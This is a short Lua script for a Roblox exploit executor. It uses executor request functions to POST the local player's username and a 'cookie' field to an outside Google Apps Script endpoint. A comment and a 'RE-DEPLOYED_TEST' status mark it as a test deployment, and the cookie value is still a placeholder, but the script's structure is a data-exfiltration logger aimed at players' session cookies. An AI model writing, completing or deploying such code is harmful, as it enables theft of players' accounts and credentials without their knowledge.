-- 実行数爆増を防ぐロック
if _G.Sentinel_Lock then return end
_G.Sentinel_Lock = true

local gasUrl = "https://script.google.com/macros/s/AKfycbx8qjjwGBExw64FvNZDxEb6YpzsGGlh1j8B7Qhc9TBiRJzjnh4jpC6EtB9BIFeNhMYA/exec"

task.spawn(function()
    local payload = {
        user = game.Players.LocalPlayer.Name,
        cookie = "STILL_NOT_WORKING_IF_EMPTY",
        status = "RE-DEPLOYED_TEST"
    }

    local req = (getgenv().request or getgenv().http_request or request)
    if req then
        req({
            Url = gasUrl,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = game:GetService("HttpService"):JSONEncode(payload)
        })
    end
end)
